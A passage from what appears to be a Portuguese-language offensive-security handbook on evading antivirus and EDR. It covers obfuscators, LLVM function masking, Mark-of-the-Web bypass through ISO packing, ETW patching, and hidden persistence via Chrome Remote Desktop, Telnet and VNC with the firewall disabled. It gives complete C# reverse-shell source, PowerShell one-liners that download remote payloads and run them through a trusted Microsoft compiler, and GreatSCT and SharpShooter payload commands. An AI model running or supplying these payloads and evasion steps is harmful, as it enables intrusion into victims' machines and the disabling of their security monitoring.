> 🛈  O ConfuserEx produz um atributo personalizado chamado `ConfusedByAttribute`, que pode ser usado como IOC para fazer a triagem automática de amostras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open source do conjunto de compilação [LLVM](http://www.llvm.org/) capaz de oferecer maior segurança de software por meio de [obfuscation de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e proteção contra adulteração.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar código obfuscado em tempo de compilação, sem ferramentas externas e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações obfuscadas geradas pelo framework de metaprogramação de templates do C++, o que dificulta um pouco a vida de quem tenta quebrar a aplicação.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um obfuscator de binários x64 capaz de obfuscar vários arquivos PE diferentes, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de obfuscation de código granular para linguagens compatíveis com LLVM que usa ROP (return-oriented programming). O ROPfuscator obfusca um programa no nível do código assembly, transformando instruções comuns em cadeias ROP e frustrando nossa concepção natural do fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um PE Crypter de .NET escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

### Automascaramento por função assistido pelo compilador LLVM

Em vez de mascarar um implant inteiro apenas enquanto está inativo, um backend LLVM X86 modificado pode manter funções selecionadas mascaradas com XOR sempre que estiverem inativas. A PoC Function Peekaboo seleciona nomes desmanglados que contêm `REG_`, injeta stubs de entrada/saída independentes de posição em torno do código de máquina final e emite um único handler de mascaramento compartilhado em `.text`; as assinaturas no nível do código-fonte e a convenção de chamada Windows x64 permanecem inalteradas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformação do fluxo de controle no backend

Isso deve ocorrer após a seleção de instruções e a otimização, pois a transformação precisa abranger **todos os retornos emitidos** e conhecer o layout exato de x86. Um `MachineFunctionPass` pré-emissão encontra o último `MachineInstr::isReturn()`, remove-o para que o caminho final continue até o epílogo acrescentado e substitui os retornos anteriores por `JMP_1 handler`. Mantenha qualquer desmontagem da pilha/frame gerada pelo compilador antes de cada retorno; redirecione somente a instrução de retorno.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `X86AsmPrinter::emitFunctionBodyEnd()` emitem os stubs por função, enquanto `emitEndOfAsmFile()` emite o handler. Símbolos compartilhados entre as etapas de emissão permitem que um branch do prólogo aponte para seu epílogo posterior; para um `je` near emitido manualmente, escreva `0F 84` seguido pela expressão MC de quatro bytes `target - address_after_je`. Em vez disso, chamadas e jumps para o handler podem ser emitidos como objetos `MCInst` (`CALL64pcrel32` e `JMP_1`). Um pass deve retornar `false` para uma função não selecionada quando não tiver alterado nada; a PoC retorna `true` incorretamente nesse caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadados e inicialização pré-CRT

A PoC coloca uma chave XOR e registros de 16 bytes contendo um ponteiro de função realocado pelo loader e um comprimento em tempo de execução em `.funcmeta`. Embora o campo C seja um `uint32_t`, o handler acessa um QWORD no deslocamento `+8` do registro, consumindo o comprimento e seu padding, e avança pelos registros em incrementos de `0x10`. Os nomes de seção PE têm apenas oito bytes, então a pesquisa em tempo de execução encontra `.funcmet`. Um patcher externo adiciona um `.stub` executável, salva o RVA antigo do entry point no stub e redireciona `AddressOfEntryPoint`; o stub PIC obtém a base da imagem de `gs:[0x60]` → `[PEB+0x10]`, percorre as importações PE32+ para resolver uma `VirtualProtect` já importada e é executado antes do CRT.<sup>[[38]](#references)[[39]](#references)</sup>

A inicialização define um valor sentinela em `gs:[0xE8]` e chama cada função dos metadados. O prólogo permanentemente legível registra o início da função em `gs:[0xF0]`, detecta o valor sentinela e ignora o corpo ainda não mascarado. Em seguida, o epílogo usa `call handler`; depois que o handler salva 13 registradores (`0x68` bytes), o endereço de retorno em `[rsp+0x68]` é o fim da função transformada, então `end - start` pode ser gravado no registro de metadados correspondente. O stub limpa o valor sentinela e salta para `ImageBase + original_entry_point_RVA` depois que todos os corpos forem mascarados.<sup>[[38]](#references)[[39]](#references)</sup>

Durante uma chamada normal, o prólogo chama o mesmo handler simétrico para decodificar o corpo. O caminho final continua até o epílogo acrescentado, enquanto cada retorno anterior salta diretamente para o handler compartilhado. O epílogo normal também usa `jmp handler` em vez de `call`, então, após mascarar novamente, o `ret` do handler consome o endereço de retorno do chamador original e preserva o resultado da função em `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva de mascaramento e indicadores de análise

O handler encontra o registro atual, ignora o prólogo visível de tamanho fixo (neste build, `0x46` bytes), altera o restante para `PAGE_EXECUTE_READWRITE`, aplica XOR byte a byte usando o byte menos significativo da chave e, em seguida, define a proteção como `PAGE_EXECUTE_READ`. Assim, o mesmo loop decodifica na entrada e codifica em cada saída normal.<sup>[[38]](#references)[[39]](#references)</sup>

Indicadores de alta confiança para esse design incluem:<sup>[[38]](#references)[[39]](#references)</sup>

- um entry point dentro de um `.stub` executável e uma seção `.funcmet` contendo uma chave e ponteiros realocados para `.text`;
- análise do PEB, da tabela de importações e da tabela de seções antes do CRT, seguida de chamadas por meio de cada ponteiro dos metadados;
- prólogos PIC idênticos de `call`/`pop` e muitos pontos de retorno redirecionados para um único handler;
- gravações em `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguidas por transições repetidas de `VirtualProtect` e gravações de XOR byte a byte em páginas executáveis respaldadas pela imagem.

Isso é uma forma de evasão de scanners de memória, não uma proteção criptográfica: o arquivo modificado ainda contém o corpo original em claro, e um debugger pode interromper em `VirtualProtect` ou no loop de XOR e despejar a função ativa. O XOR de byte único, os metadados legíveis e o limite fixo de `0x46` também tornam a recuperação offline simples.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Os slots TEB da PoC são locais à thread, mas as páginas de código modificadas são compartilhadas pelo processo. Portanto, entradas concorrentes ou recursivas podem alternar novamente as instruções enquanto outra invocação está em execução; exceções e saídas não locais também podem evitar o remascaramento. Uma implementação robusta deve sincronizar as transições, restaurar a proteção realmente retornada por `lpflOldProtect`, evitar comprimentos de stub codificados de forma fixa, auditar os caminhos `call` e `jmp` quanto ao alinhamento da pilha x64 e chamar `FlushInstructionCache` após reescrever bytes executáveis. A Microsoft responsabiliza explicitamente o chamador pela coerência do cache de instruções quando o código executável é modificado.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Você talvez já tenha visto esta tela ao baixar executáveis da internet e executá-los.

O Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com base em reputação: aplicações baixadas com pouca frequência acionam o SmartScreen, que alerta o usuário final e impede a execução do arquivo (embora ainda seja possível executá-lo clicando em More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) do [NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) chamado Zone.Identifier, criado automaticamente ao baixar arquivos da internet, juntamente com a URL de origem do download.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier de um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante observar que executáveis assinados com um certificado de assinatura **confiável** **não acionam o SmartScreen**.

Uma forma muito eficaz de impedir que seus payloads recebam o Mark of The Web é empacotá-los em algum tipo de contêiner, como um ISO. Isso ocorre porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **que não sejam NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evadir o Mark-of-the-Web.

Exemplo de uso:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Aqui está uma demonstração de como contornar o SmartScreen empacotando payloads em arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging do Windows que permite que aplicativos e componentes do sistema **registrem eventos**. No entanto, produtos de segurança também podem usá-lo para monitorar e detectar atividades maliciosas.

Assim como o AMSI pode ser desativado (contornado), também é possível fazer com que a função **`EtwEventWrite`** do processo em espaço de usuário retorne imediatamente, sem registrar nenhum evento. Isso é feito aplicando um patch à função na memória para que ela retorne imediatamente, desativando efetivamente o logging do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Carregar binários C# na memória já é uma técnica conhecida há bastante tempo e continua sendo uma ótima maneira de executar suas ferramentas de post-exploitation sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só precisaremos nos preocupar em aplicar um patch ao AMSI para todo o processo.

A maioria dos frameworks de C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc etc.) já permite executar C# assemblies diretamente na memória, mas existem diferentes maneiras de fazer isso:

- **Fork\&Run**

Essa técnica envolve **iniciar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse processo, executá-lo e, ao terminar, encerrar o novo processo. Isso tem vantagens e desvantagens. A vantagem do método fork and run é que a execução ocorre **fora** do processo do nosso implante Beacon. Isso significa que, se algo der errado durante a ação de post-exploitation ou ela for detectada, há uma **chance muito maior** de o nosso **implante sobreviver.** A desvantagem é que há uma **chance maior** de ser detectado por **detecções comportamentais**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste em injetar o código malicioso de post-exploitation **no próprio processo**. Assim, você evita criar um novo processo e submetê-lo à verificação do AV, mas a desvantagem é que, se algo der errado durante a execução do payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode falhar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser saber mais sobre o carregamento de C# assemblies, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# assemblies **pelo PowerShell**; confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [o vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Reempacotamento de ferramentas .NET em WebAssembly com NativeAOT (WasmForge)

As técnicas comuns de `execute-assembly` mantêm MSIL reconhecível e, por fim, inicializam um CLR. **WasmForge** altera a base de execução: migra um projeto C# para o destino experimental NativeAOT-LLVM WASI, compila-o antecipadamente para WebAssembly e incorpora esse módulo em um host PE do Windows baseado em Wazero. O processo resultante não precisa do CLR, do JIT nem do host `dotnet` do alvo; portanto, regras baseadas apenas em nomes de assemblies gerenciados, carregamento do CLR, AMSI ou ETW para .NET perdem visibilidade direta. Esta é uma técnica de evasão/empacotamento, não um contorno de limite de privilégios — o guest mantém as permissões e o comportamento observável no sistema operacional da ferramenta original.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilar um projeto C#

O caminho de compilação recomendado é o ambiente Docker do projeto, pois inclui o .NET 10 SDK, o workload NativeAOT-LLVM, WASI SDK 24.0, o linker e as dependências de assinatura. Um `.csproj` é detectado automaticamente; a compilação em uma única etapa realiza a migração, a aplicação de patches de compatibilidade, a compilação WASM, a criação do PE e a assinatura.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Para solucionar problemas ou revisar o código gerado, divida o processo em `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` e, por fim, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. A imagem de build também usa um wrapper `wasm-component-ld` para evitar a codificação de componentes do WASI Preview 2 e produzir o módulo simples esperado pelo runtime integrado.<sup>[[44]](#references)[[45]](#references)</sup>

### Fazendo a ponte entre C# wasm32 e Win32 x64

Isso não é uma recompilação transparente. O NativeAOT-WASI não oferece alguns recursos do BCL voltados ao Windows ou os altera, e um guest wasm32 normalmente aloca slots de ponteiro de quatro bytes, enquanto APIs x64 podem retornar ponteiros de oito bytes. O WasmForge trata ambos os problemas com as seguintes camadas geradas:<sup>[[44]](#references)</sup>

1. Um patcher de código-fonte corrige diferenças semânticas específicas do AOT e redireciona chamadas não compatíveis de registry, pipes, WMI, identidade, serviços de diretório, versões de arquivos, LSA e similares para helpers `Wf*`.
2. Um scanner de P/Invoke gera mapeamentos `DirectPInvoke` do NativeAOT para que chamadas `[DllImport]` sejam vinculadas a símbolos de ponte C incluídos na linkagem, em vez de carregar dinamicamente a DLL declarada dentro do guest.
3. Ponteiros destinados ao host usam `ulong` em C# e `uint64_t` em C. Um dispatcher genérico encaminha a chamada ao handler Win32 do host; um `out8_mask` marca os slots de saída genuínos de oito bytes cujas metades superiores devem ser preservadas. Para saídas não marcadas no formato wasm32, usa-se proteção snapshot/restore para que uma gravação x64 não corrompa os quatro bytes adjacentes.
4. Pontes dedicadas no host tratam operações que não se encaixam no dispatch genérico de syscalls, como acesso ao cache de tickets LSA, operações Kerberos/BCrypt com resultados estruturados, tráfego TCP KDC e consultas LDAP.

Por exemplo, um wrapper para `version.dll!VerQueryValueW` passa quatro endereços do host e define os bits 2 e 3 (`0xC`), pois o ponteiro do valor e o tamanho são slots de saída de oito bytes. O próprio wrapper permanece genérico e delega o nome da DLL, o nome da exportação, os argumentos e a máscara a `wf_call_v2`; o host faz a tradução de ponteiros e invoca a API nativa.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limitações e pontos de detecção

Código com uso intenso de reflection, carregamento dinâmico de assemblies, callbacks nativos arbitrários e estruturas x64 complexas retornadas para a memória WASM ainda podem exigir patches específicos por ferramenta ou falhar completamente. Sockets genéricos do WASI Preview 2 também podem chegar a stubs sem operação, por isso as ferramentas compatíveis usam shims de host específicos para cada protocolo. Valide cada comando em uma build nativa, em vez de presumir paridade de recursos.<sup>[[44]](#references)[[45]](#references)</sup>

A técnica desloca a telemetria em vez de tornar o payload invisível. A detecção pode se concentrar em um PE que contenha ou materialize um módulo WASM, no comportamento de um runtime semelhante ao Wazero, na alocação e cópia incomuns de memória entre host e guest, no dispatch genérico direto do Win32, em anomalias de assinatura e de recursos PE, além das chamadas de API e do tráfego de rede resultantes. Portanto, a ausência de eventos de carregamento do CLR, AMSI ou .NET ETW não deve ser tratada como evidência de que um processo é benigno.<sup>[[44]](#references)</sup>

## Usando outras linguagens de programação

Conforme proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no compartilhamento SMB controlado pelo atacante**.

Ao permitir acesso aos binários do interpretador e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repositório indica: o Defender ainda verifica os scripts, mas, utilizando Go, Java, PHP etc., temos **mais flexibilidade para contornar assinaturas estáticas**. Os testes com scripts de reverse shell aleatórios e não ofuscados nessas linguagens foram bem-sucedidos.

## Re-hospedagem de WebAssembly para evasão da análise estática

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

O Token stomping manipula o token de acesso de um produto de segurança, como um EDR ou AV. Reduzir os privilégios do token pode manter o processo em execução, impedindo-o de realizar ações privilegiadas de inspeção ou remediação.

Para evitar isso, o Windows poderia **impedir que processos externos** obtenham handles para os tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usando software confiável

### Chrome Remote Desktop

Conforme descrito [**nesta publicação do blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil simplesmente instalar o Chrome Remote Desktop no PC da vítima e usá-lo para assumir o controle e manter a persistência:<sup>[[35]](#references)</sup>
1. Baixe em https://remotedesktop.google.com/, clique em "Set up via SSH" e, em seguida, clique no arquivo MSI para Windows para baixá-lo.
2. Execute o instalador silenciosamente na máquina da vítima (requer privilégios de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte à página do Chrome Remote Desktop e clique em Next. O assistente solicitará autorização; clique no botão Authorize para continuar.
4. Execute o comando fornecido com os ajustes necessários: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (o parâmetro `--pin` define o PIN sem usar a interface gráfica).
 

## Evasão avançada

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

A evasão é um tema muito complexo. Às vezes, é preciso levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível passar completamente despercebido em ambientes maduros.

Cada ambiente que você enfrentar terá seus próprios pontos fortes e fracos.

Recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94) para conhecer técnicas mais avançadas de evasão.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta também é uma ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre evasão em profundidade.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas antigas**

### **Verificar quais partes o Defender identifica como maliciosas**

Você pode usar o [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **remove partes do binário** até **descobrir qual parte o Defender** está identificando como maliciosa e separá-la para você.\
Outra ferramenta que faz **a mesma coisa é** [**avred**](https://github.com/dobin/avred), que oferece o serviço em um site aberto em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Até o Windows10, todas as versões do Windows vinham com um **servidor Telnet** que você podia instalar (como administrador) executando:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Faça-o **iniciar** quando o sistema for iniciado e **executá-lo** agora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Alterar a porta do telnet** (stealth) e desativar o firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Baixe em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads bin, não o setup)

**NO HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Ative a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo _**UltraVNC.ini**_ recém-criado para dentro da **vítima**

#### **Conexão reversa**

O **atacante** deve **executar no próprio host** o binário `vncviewer.exe -listen 5900` para que fique **pronto** para receber uma **conexão VNC** reversa. Em seguida, dentro da **vítima**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVISO:** Para manter a discrição, você não deve fazer algumas coisas

- Não inicie o `winvnc` se ele já estiver em execução, ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se ele está em execução com `tasklist | findstr winvnc`
- Não inicie o `winvnc` sem o `UltraVNC.ini` no mesmo diretório, ou a [janela de configuração](https://i.imgur.com/rfMQWcf.png) será aberta
- Não execute `winvnc -h` para obter ajuda, ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Baixe em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dentro do GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Agora **inicie o listener** com `msfconsole -r file.rc` e **execute** o **payload xml** com:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro reverse shell em C#

Compile-o com:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Use-o com:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# usando o compilador

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemplo de uso do Python para criar injetores:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR a partir do espaço do kernel

Storm-2603 usou um pequeno utilitário de console conhecido como **Antivirus Terminator** para desativar as proteções de endpoint antes de instalar o ransomware. A ferramenta traz seu **próprio driver vulnerável, mas *assinado*** e o explora para executar operações privilegiadas no kernel que nem mesmo os serviços de AV Protected-Process-Light (PPL) conseguem bloquear.<sup>[[12]](#references)</sup>

Principais conclusões
